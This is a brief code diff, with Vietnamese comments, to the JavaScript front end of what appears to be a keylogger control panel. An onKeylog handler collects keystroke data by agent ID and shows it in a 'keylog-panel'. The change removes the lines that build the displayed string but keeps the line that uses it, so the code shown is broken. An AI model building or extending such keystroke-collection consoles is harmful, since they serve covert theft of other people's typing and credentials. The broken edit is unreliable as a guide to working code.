@@ -324,16 +324,7 @@ const gateway = new Gateway({
         }
     },
     onKeylog: (keyData, agentId) => {
-        // SỬA: Xử lý hiển thị thô cho global log (tránh crash khi nhận Array)
-        let displayString = "";
-        
-        if (Array.isArray(keyData)) {
-            // Nếu là mảng, nối lại thành chuỗi để hiển thị log đơn giản
-            displayString = keyData.join(""); 
-        } else {
-            displayString = String(keyData);
-        }
-
+        if (window.keyloggerApp) return;
         const keylogPanel = document.getElementById('keylog-panel');
         if (keylogPanel) {
             keylogPanel.value += displayString;
